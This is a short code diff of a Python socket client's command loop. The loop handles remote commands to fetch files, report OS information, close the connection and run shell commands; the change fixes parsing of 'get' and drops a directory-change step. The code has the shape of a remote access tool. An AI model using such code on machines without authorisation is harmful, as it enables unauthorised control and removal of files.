@@ -124,16 +124,17 @@ def main():
                 elif cmd == "esc":
                     esc = exitNClose(clientSocket)
 
-                elif "get" in cmd:
+                elif "get " in cmd:
                     path = ""
                     fileName = cmd.replace("get ", "")
-                    path = os.path.join(path, os.getcwd(), fileName)
-                    print(path)
-                    if os.path.exists(path):
-                        clientSocket.send("ok".encode())
-                        getFile(clientSocket, fileName)
-                    else:
-                        clientSocket.send("ko".encode())
+                    if not fileName == "":
+                        path = os.path.join(path, os.getcwd(), fileName)
+                        print(path)
+                        if os.path.exists(path):
+                            clientSocket.send("ok".encode())
+                            getFile(clientSocket, fileName)
+                        else:
+                            clientSocket.send("ko".encode())
 
                 elif cmd == "infoOs":
                     sendOsInfo(clientSocket)
@@ -142,8 +143,6 @@ def main():
                     shellCommand = clientSocket.recv(1024).decode() #78
                     if searchCmd(clientSocket, shellCommand):
                         print("true")
-                        path = clientSocket.recv(1024).decode() #155
-                        changeDirectory(clientSocket, "cd " + path)
 
         except Exception as e:
             print(e)
